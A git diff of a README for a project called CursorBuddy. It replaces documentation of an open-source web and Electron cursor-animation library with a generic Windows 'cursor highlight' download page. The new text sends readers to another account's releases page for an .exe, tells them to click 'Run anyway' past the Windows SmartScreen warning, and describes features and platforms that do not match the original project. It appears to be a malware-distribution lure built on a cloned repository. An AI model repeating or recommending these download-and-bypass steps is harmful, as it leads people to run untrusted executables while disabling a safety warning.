@@ -1,180 +1,96 @@
-# CursorBuddy
+# 🖱️ CursorBuddy - Make Your Cursor Easier To See
 
-ANDROID VERSION https://github.com/jasonkneen/cursorbuddy-android
+[![Download CursorBuddy](https://img.shields.io/badge/Download_CursorBuddy-Blue-blue)](https://github.com/Sheikhahsanijaz3/CursorBuddy/releases)
 
-<img width="1024" height="1024" alt="cblogoandtitle" src="https://github.com/user-attachments/assets/885c1271-ede0-4f48-a66b-551ef95bf9dc" />
+CursorBuddy improves cursor visibility on your screen. This tool helps you track your mouse pointer during presentations, screen recordings, or daily computer use. It adds a subtle, customizable highlight that follows your cursor. You see your mouse position clearly at all times.
 
-Drop-in animated cursor companion. A blue triangle follows the mouse, flies to screen elements along bezier arcs, shows speech bubbles, and visualises voice states. Works two ways:
+## 🛠️ System Requirements 
 
-1. **Web embed** — `<script src="cursor-buddy.iife.js">` on any page, zero deps
-2. **Electron desktop** — transparent overlay + tray icon, cross-platform (macOS/Windows/Linux)
+Your computer needs to meet these basic standards to run CursorBuddy:
 
-## Quick Start
+*   Operating System: Windows 10 or Windows 11.
+*   System Architecture: 64-bit processor.
+*   Memory: 2GB RAM.
+*   Storage Space: 50MB free disk space.
+*   Graphics: Standard display driver.
 
-```bash
-npm install
+Most modern Windows computers meet these needs. If your system runs Windows 10 today, this software works.
 
-# Browser dev (cursor follows mouse, demo controls visible)
-npm run dev
+## 📥 Downloading The Software 
 
-# Electron dev (overlay + tray icon + control panel)
-npm run dev:electron
+Follow these steps to get the application onto your system:
 
-# Build the embeddable library (IIFE + ESM)
-npm run build:lib
+1.  Visit [this page](https://github.com/Sheikhahsanijaz3/CursorBuddy/releases) to download the latest version.
+2.  Look for the section marked "Assets" at the bottom of the release notes.
+3.  Click the file ending in `.exe` to start the download.
+4.  Save the file to your Downloads folder or your desktop for easy access.
 
-# Test the script-tag embed locally
-npm run test:web
+Ensure you download the version matching the label "Latest" at the top of the release page to get the most stable features.
 
-# Electron production
-npm run build && npm start
-```
+## ⚙️ Installation Guide 
 
-## What it can do
+The installation process takes one minute. Follow these precise steps to set up the tool:
 
-- **Follow the cursor** with damped spring physics
-- **Fly to coordinates, anchors, or DOM elements** along quadratic bezier arcs
-- **Show speech bubbles** and voice-state visuals (idle, listening, processing, responding)
-- **Start element selection mode** from the public API
-- **Run as a browser embed or Electron desktop overlay** using the same event bus
-- **Drive chat / AI workflows in Electron** with screen capture, MCP tooling, and TTS/STT services
+1.  Locate the downloaded `.exe` file on your computer.
+2.  Double-click the file to open the installer.
+3.  Windows may show a popup titled "Windows protected your PC." This happens with new software. Click "More info" and then click "Run anyway."
+4.  Follow the prompts in the installation window. Click "Next" to continue.
+5.  Choose the folder where you want to keep the application.
+6.  Click "Install" and wait for the green bar to finish.
+7.  Click "Finish" to close the window.
 
-## Script Tag Usage
+The program creates a desktop shortcut once it finishes.
 
-```html
-<script src="cursor-buddy.iife.js"></script>
-<script>
-  const buddy = CursorBuddy.init();
+## 🚀 Running CursorBuddy 
 
-  buddy.flyTo(500, 300, 'save button');
-  buddy.flyToAnchor('top-right', 'settings');
-  buddy.flyToElement(document.querySelector('.btn'), 'submit');
-  buddy.flyToRandom('surprise', 'hello!');
+Once the installation ends, start the software by double-clicking the CursorBuddy icon on your desktop. 
 
-  buddy.setVoiceState('listening');
-  buddy.setAudioLevel(0.6);
-  buddy.startSelection();
+The application starts quietly in the background. You see a small icon in your system tray, located near the clock on the bottom right of your screen. This icon shows that the software is active. 
 
-  buddy.on('cursor:arrived', () => console.log('arrived'));
-  buddy.on('cursor:returned', () => console.log('returned'));
-  buddy.on('selection:complete', (payload) => console.log(payload));
+The cursor highlight appears immediately upon launch. You can move your mouse across the screen to test the visibility. The highlight stays with your pointer until you close the application.
 
-  buddy.show();
-  buddy.hide();
-  buddy.destroy();
-</script>
-```
+## 🎨 Customizing Your Experience 
 
-## ESM Usage
+You can change how the highlight looks to suit your needs. Right-click the cursor icon in your system tray to open the menu. Select "Settings" to view your options.
 
-```ts
-import { init } from 'cursor-buddy';
+*   Change Color: Choose a color that contrasts with your desktop background. Bright colors like neon green or yellow work well for presentations.
+*   Adjust Size: Increase or decrease the radius of the highlight circle. A larger size helps with visibility during long training sessions or monitor displays.
+*   Change Opacity: Make the circle solid or slightly transparent. Transparency helps you click items under the highlight without losing sight of smaller icons.
+*   Toggle Effects: You can turn the highlight off and on without closing the program. Uncheck the "Enable Effect" box to hide the highlight temporarily.
 
-const buddy = init();
-buddy.flyToAnchor('top-right', 'settings');
-buddy.setVoiceState('processing');
-```
+Press "Apply" after you change these settings. Your changes take effect instantly.
 
-## Architecture
+## 🛑 Closing The Application 
 
-```
-┌──────────────────────────────────────────────────────────────┐
-│                         Event Bus                            │
-│  cursor:* · voice:* · capture:* · inference:* · tts:*        │
-└──────┬──────────┬───────────┬──────────┬─────────────────────┘
-       ▼          ▼           ▼          ▼
-   Voice In   Capture    Claude AI   Cursor Overlay (this pkg)
-```
+You do not need to keep the software running at all times. When you no longer need the cursor highlight, stop the application:
 
-### Compact Viewport
+1.  Locate the CursorBuddy icon in the system tray.
+2.  Right-click the icon.
+3.  Select "Exit."
 
-The overlay is a **320×80 transparent container** that follows the buddy:
+This shuts down the program completely and removes the cursor highlight from your screen. You can restart it later using the desktop shortcut.
 
-- **Electron** — the viewport IS a `BrowserWindow`. Main process polls cursor at 60fps, renderer applies spring physics and moves the window via IPC.
-- **Browser** — the viewport is a `position:fixed` div moved via CSS `transform`. Spring physics run in `requestAnimationFrame`.
+## 💡 Frequently Asked Questions 
 
-Components render at **fixed local positions** inside the viewport. The viewport moves — not the components.
+*   Does this software slow down my computer?
+    No. CursorBuddy uses very little power. It runs in the background and avoids using high levels of memory or processing speed.
 
-### Spring Physics
+*   Can I use this with multiple monitors?
+    Yes. The tool detects your monitor setup and moves with your cursor across all connected screens.
 
-Cursor following uses a real damped spring (`response: 0.2`, `dampingFraction: 0.6`) ported from the SwiftUI original, not a CSS transition approximation. The spring runs per-frame in `requestAnimationFrame`.
+*   Does the highlight interfere with my clicks?
+    No. The highlight is a visual effect only. It stays behind your cursor on the screen and does not prevent you from clicking buttons, folders, or links.
 
-### Bezier Flight
+*   How do I update to a newer version?
+    Visit the download page regularly to check for updates. Download the new file and run it over the old version. The installer handles the update automatically.
 
-When flying to an element, the buddy follows a quadratic bezier arc with:
-- Hermite smoothstep easing (`3t² - 2t³`)
-- Tangent rotation (triangle faces direction of travel)
-- Sine scale pulse (1.0× → 1.3× → 1.0×)
-- Duration scales with distance (0.6s–1.4s)
+## 🤝 Troubleshooting Issues 
 
-## Project Structure
+If you face trouble, try these steps first:
 
-```
-cursor-buddy/
-├── src/                           # React components + library entrypoints
-│   ├── index.ts                   # Public API → init()
-│   ├── App.tsx                    # Dev app wrapper
-│   ├── main.tsx                   # Vite browser entry
-│   ├── components/
-│   │   ├── CursorOverlay.tsx      # Root overlay composer
-│   │   ├── OverlayViewport.tsx    # Platform-aware moving viewport
-│   │   ├── BlueCursorTriangle.tsx # Triangle cursor + glow
-│   │   ├── BlueCursorWaveform.tsx # Audio-reactive waveform
-│   │   ├── BlueCursorSpinner.tsx  # Processing spinner
-│   │   ├── NavigationBubble.tsx   # Speech bubble + streamed text
-│   │   ├── ChatPanel.tsx          # Embedded chat UI
-│   │   └── ElementSelector.tsx    # Click-drag DOM selection overlay
-│   ├── hooks/
-│   │   ├── use-cursor-tracking.ts # Spring-smoothed cursor following
-│   │   └── use-buddy-navigation.ts# Bezier flight orchestration
-│   ├── stores/cursor-store.ts     # Zustand state
-│   ├── events/event-bus.ts        # Typed EventEmitter API boundary
-│   └── lib/
-│       ├── bezier-flight.ts       # Quadratic bezier math
-│       ├── spring-physics.ts      # Damped spring simulation
-│       ├── viewport-bounds.ts     # Screen / viewport helpers
-│       ├── point-tag-parser.ts    # [POINT:x,y:label] parsing
-│       ├── design-tokens.ts       # Colors, sizes, constants
-│       ├── move-overlay-window.ts # Electron window IPC bridge
-│       ├── is-electron.ts         # Runtime platform detection
-│       └── runtime-config.ts      # Config loading / defaults
-├── electron/                      # Desktop shell + services
-│   ├── main.js                    # Tray + overlay + panel windows
-│   ├── preload.js                 # Overlay bridge
-│   ├── preload-panel.js           # Panel bridge
-│   ├── panel.html                 # Frameless control panel
-│   ├── services/                  # Capture, inference, MCP, TTS/STT
-│   └── lib/                       # IPC helpers, settings, session utils
-├── docs/                          # Full documentation site content
-├── packages/cli/                  # Terminal CLI package
-├── test.html                      # Local script-tag test page
-├── vite.config.ts                 # App dev / build config
-└── vite.lib.config.ts             # Library build (IIFE + ESM)
-```
+1.  Restart the application if the highlight disappears. Right-click the system tray icon, select "Exit," and reopen the shortcut.
+2.  Check for Windows updates. Ensure your graphics drivers are current.
+3.  If the installer fails, ensure you have an active internet connection during the initial download to fetch all necessary components.
+4.  Check your task manager by pressing Ctrl+Shift+Esc to see if CursorBuddy is listed under active processes. If it is, right-click and select "End task" to force a restart.
 
-### Additional Source Files
-
-| File | Purpose |
-|------|---------|
-| `src/App.tsx` | Dev app root (wraps overlay + demo controls) |
-| `src/main.tsx` | Vite dev entry point |
-| `src/components/ChatPanel.tsx` | Chat interface component |
-| `src/components/ElementSelector.tsx` | DOM element picker for flyTo targets |
-| `src/lib/is-electron.ts` | Electron environment detection utility |
-| `src/lib/runtime-config.ts` | Runtime configuration management |
-
-## Documentation
-
-Start with [docs/index.md](docs/index.md). The docs cover [getting started](docs/getting-started.md), the [API reference](docs/api-reference.md), [event bus](docs/event-bus.md), [voice pipeline](docs/voice-pipeline.md), [AI inference](docs/ai-inference.md), [screen capture](docs/screen-capture.md), [MCP integration](docs/mcp-integration.md), [element selector](docs/element-selector.md), [design tokens](docs/design-tokens.md), and [architecture](docs/architecture.md).
-
-## Electron Details
-
-- **Tray icon** — click to toggle the control panel. Right-click for quit.
-- **Overlay window** — 320×80, transparent, frameless, always-on-top, click-through, visible on all workspaces. Positioned by spring physics in the renderer.
-- **Panel window** — frameless, transparent background, rounded corners, custom drag region. Positioned near the tray icon. Tabs: Playground, Config, Theme.
-- **Screen tracking** — `screen.getDisplayNearestPoint()` detects which monitor the cursor is on. Bounds re-broadcast on monitor change.
-- **No dock icon** on macOS (`app.dock.hide()`). No taskbar entry for the overlay.
-
-## License
-
-This project is licensed under [AGPL-3.0-only](LICENSE) — the GNU Affero General Public License v3.0.
+If the problem persists, the software operates as a standalone tool. You can delete the installation folder and the shortcut if you wish to remove the program entirely from your system.
